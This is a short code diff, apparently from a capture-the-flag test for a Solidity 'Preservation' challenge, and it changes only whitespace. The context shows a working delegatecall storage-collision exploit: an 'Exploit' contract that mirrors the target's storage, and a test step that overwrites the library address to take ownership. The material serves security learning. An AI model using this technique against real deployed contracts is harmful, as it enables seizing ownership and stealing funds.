@@ -11,8 +11,7 @@ contract Exploit {
     address public unused2;
     address public owner;
 
-    constructor() {
-    }
+    constructor() { }
 
     function setTime(uint256 _time) public {
         owner = address(uint160(_time));
@@ -38,7 +37,7 @@ contract PreservationTest is Test {
 
         // attack
         Exploit exploit = new Exploit();
-        
+
         // change the address of the timeZone1Library first
         preservation.setFirstTime(uint256(uint160(address(exploit))));
         assertEq(preservation.owner(), address(factory));
